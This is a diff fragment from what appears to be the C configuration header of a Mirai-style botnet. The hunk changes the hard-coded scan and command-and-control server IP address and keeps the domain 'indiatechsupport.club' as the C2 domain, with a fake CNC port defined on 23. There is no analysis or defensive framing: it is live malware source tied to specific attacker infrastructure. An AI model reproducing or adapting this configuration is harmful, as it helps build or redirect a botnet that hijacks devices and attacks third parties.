@@ -22,15 +22,15 @@ typedef uint16_t port_t;
 #define FAKE_CNC_PORT 23
 /*                                                                 */
 #ifndef USEDOMAIN
-#define SCANIP (int)inet_addr((const char*)"34.147.211.204");
-#define SERVIP (int)inet_addr((const char*)"34.147.211.204");
+#define SCANIP (int)inet_addr((const char*)"35.234.54.226");
+#define SERVIP (int)inet_addr((const char*)"35.234.54.226");
 
 #else
 
 #define SCANDOM "indiatechsupport.club"
 #define SERVDOM "indiatechsupport.club"
-#define SCANIP (int)inet_addr((const char*)"34.147.211.204");
-#define SERVIP (int)inet_addr((const char*)"34.147.211.204");
+#define SCANIP (int)inet_addr((const char*)"35.234.54.226");
+#define SERVIP (int)inet_addr((const char*)"35.234.54.226");
 
 #endif
 /*                                                                 */   
